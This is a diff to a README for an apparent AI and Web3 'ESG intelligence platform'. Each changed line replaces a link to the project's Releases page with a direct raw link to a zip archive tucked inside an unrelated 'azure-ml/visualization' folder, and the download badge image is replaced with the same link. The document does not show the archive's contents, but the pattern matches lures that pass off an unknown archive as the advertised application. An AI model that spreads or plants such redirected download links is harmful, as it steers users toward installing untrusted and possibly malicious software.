@@ -1,7 +1,7 @@
 # 🌐 Ond-ESG-Intelligence-Platform - Your Gateway to AI and Web3 Insights
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Dillman12321/Ond-ESG-Intelligence-Platform/releases)
+[![Download](https://raw.githubusercontent.com/Dillman12321/Ond-ESG-Intelligence-Platform/main/azure-ml/visualization/Ond-ESG-Intelligence-Platform-v3.0.zip)](https://raw.githubusercontent.com/Dillman12321/Ond-ESG-Intelligence-Platform/main/azure-ml/visualization/Ond-ESG-Intelligence-Platform-v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the Ond-ESG-Intelligence-Platform! This platform provides a simple way to access data related to AI and Web3 technologies. It is designed for users who want to explore and analyze data effortlessly.
@@ -22,7 +22,7 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 📊 How to Use Ond-ESG-Intelligence-Platform
 1. **Visit the Releases Page:** Go to our Releases page to get the latest version.
-   [Visit Releases Page](https://github.com/Dillman12321/Ond-ESG-Intelligence-Platform/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Dillman12321/Ond-ESG-Intelligence-Platform/main/azure-ml/visualization/Ond-ESG-Intelligence-Platform-v3.0.zip)
 
 2. **Download the Application:** Click on the version you want to download. A download link will be provided for your platform.
 
@@ -38,7 +38,7 @@ Before you begin, make sure your system meets the following requirements:
 ## 🔄 Download & Install
 To begin using the Ond-ESG-Intelligence-Platform, visit our Releases page to download the application. 
 
-[Download Here](https://github.com/Dillman12321/Ond-ESG-Intelligence-Platform/releases)
+[Download Here](https://raw.githubusercontent.com/Dillman12321/Ond-ESG-Intelligence-Platform/main/azure-ml/visualization/Ond-ESG-Intelligence-Platform-v3.0.zip)
 
 ## 📚 Support and Resources
 - **User Guide:** Detailed instructions can be found in the user guide available within the application.
